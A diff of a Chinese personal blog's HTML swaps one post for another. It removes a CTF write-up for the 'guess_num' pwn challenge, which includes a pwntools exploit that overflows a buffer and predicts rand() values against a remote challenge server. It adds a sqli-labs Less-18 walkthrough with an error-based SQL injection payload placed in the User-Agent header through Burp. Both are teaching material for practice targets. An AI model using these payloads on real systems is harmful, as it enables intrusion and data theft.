@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="guess_num, 矢坕个人博客">
+    <meta name="keywords" content="bp初体验sqli-18, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>guess_num | 矢坕个人博客</title>
+    <title>bp初体验sqli-18 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">guess_num</h1>
+                    <h1 class="description center-align post-title">bp初体验sqli-18</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn-write-up/">
-                                <span class="chip bg-color">pwn-write-up</span>
+                            <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                <span class="chip bg-color">web原理讲解</span>
                             </a>
                         
                     </div>
@@ -447,28 +447,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-28
+                    2023-03-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-03-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    543
+                    367
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -486,35 +486,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="guess-num-wp"><a href="#guess-num-wp" class="headerlink" title="guess_num wp"></a>guess_num wp</h2><p>为什么写这题呢？感觉这题很有代表性（学到的东西挺多），以后很多的问题可以提前解决，所以写一篇博客记录一下。<br>先checksec一下：<br><img src="/images/guess-num/1.png"><br>吓死本菜鸡了！竟然三个保护机制全开了！<br>我们拖入IDA查看：<br><img src="/images/guess-num/2.png"><br>代码还有点小长……<del>当场决定放弃</del>咳咳，这题着实吓到我了，看一下有没有威胁函数，发现gets函数可以无限输入<br>硬着头皮查看每个函数，发现：<br><img src="/images/guess-num/03.png"><br>sub_C3E函数里可以直接抓取flag，回去看一眼这个函数的位置，在最底部，中间有个循环判断而且有个exit（0）想要运行sub_C3E必须要绕过他（从判断脱离出来）<br>但我又不知道srand()函数和rand()函数有什么作用……去网上查一查发现这两个函数要配合使用srand()函数为rand()函数初始化，srand()里的参数不同对应rand()的产生的随机数也不同<br>但只要srand()里的数是固定的，那么rand产生的随机数也是固定的。<br>那么就要自己写个程序：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-	<span class="token keyword">int</span> key<span class="token punctuation">,</span>i<span class="token punctuation">;</span>
-	<span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-		key<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
-		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>运行去查看它产生的随机数，这里我们选择0<del>（方便）</del><br>又涉及到一个冷知识同一串程序在linux和windows中产生的随机数是不一样的！<del>好吧，摊牌了我看了wp，哈哈</del>咳咳，<br>结果把cpp文件拖到虚拟机里运行又出了问题……<br><img src="/images/guess-num/04.png"><br>这里要改一下进行以下操作：</p>
-<pre class="line-numbers language-none"><code class="language-none">1.  cc c.cpp（原来的名字） -o 1c（想改的文件名）
+                <h1 id="sqli-labs-less-18-19"><a href="#sqli-labs-less-18-19" class="headerlink" title="sqli-labs less-18~19"></a>sqli-labs less-18~19</h1><hr>
+<h2 id="新的考点"><a href="#新的考点" class="headerlink" title="新的考点"></a>新的考点</h2><hr>
+<p>这题和之前的关卡都不一样，不管输入什么都没有任何回显，这是因为用户名与密码的获取方式是post,而且采用了check_input处理，所以在这两个地方注入不行,源码如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-2.  .&#x2F;1c  #运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>我原来的文件名是c.cpp经过上述操作改成了1c（就可以用了，我也不知道为什么）<br>运行一下：<br><img src="/images/guess-num/5.png"><br>把数据记下来。<br>上exp：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">60001</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-rand<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">]</span>
-<span class="token keyword">for</span> i <span class="token builtin">int</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>
-	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>获得flag：<br><img src="/images/guess-num/6.png"></p>
+	<span class="token punctuation">&#123;</span>
+	<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是题目在登入后，回显了我们的IP地址和我们的User Agent，我们猜测注入点在此。<br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/1.png"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>这个就是获取我们User Agent的函数
+……
+<span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">#这是负责插入uagent的地方</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>insert……values……看这篇<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_insert.asp">文章</a></p>
+<h2 id="bp抓包初体验"><a href="#bp抓包初体验" class="headerlink" title="bp抓包初体验"></a>bp抓包初体验</h2><hr>
+<p>我们先抓取登录时的包：<br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/2.png"><br>我们将User Agent的值给改了，改成我们的报错注入语句<code>&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1),1,1) -- q</code>，再放包就可以看到报错出我们想要的信息了<br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/3.png"><br>这里网上有些说注释– q、-+、#用不了，不是这个原因，这里是因为原来要传入’$uagent’, ‘$IP’, $uname三个值，如果提前在，‘1,1）’前注释了后面两个值就没了，和insert……values……函数格式不符，因此不能回显，我们加上‘1,1）’就是为了回应前面的格式并且用）将‘VALUES (’这里的刮号给闭合并且将后面注释掉就可以了，剩下的就是更换语句就不列举了</p>
 
                 
             </div>
@@ -541,7 +527,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/28/guess-num/">http://airunfive.github.io/2022/12/28/guess-num/</a>
+                    <a href="http://airunfive.github.io/2023/03/31/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/">http://airunfive.github.io/2023/03/31/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -579,8 +565,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn-write-up/">
-                                    <span class="chip bg-color">pwn-write-up</span>
+                                <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                    <span class="chip bg-color">web原理讲解</span>
                                 </a>
                             
                         </div>
@@ -750,17 +736,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/31/int-overflow/">
+                <a href="/2023/03/31/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="int_overflow">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="bp初体验sqli-18">
                         
-                        <span class="card-title">int_overflow</span>
+                        <span class="card-title">bp初体验sqli-18</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -770,9 +757,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -781,11 +768,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">web原理讲解</span>
                     </a>
                     
                 </div>
@@ -799,13 +787,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                <a href="/2023/03/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="栈转移原理与通用garget的使用">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="布尔盲注与时间盲注">
                         
-                        <span class="card-title">栈转移原理与通用garget的使用</span>
+                        <span class="card-title">布尔盲注与时间盲注</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -816,7 +804,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-29
                             </span>
                         <span class="publish-author">
                             
@@ -829,8 +817,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
-                        <span class="chip bg-color">pwn原理讲解 pwn_write_up</span>
+                    <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">web原理讲解</span>
                     </a>
                     
                 </div>
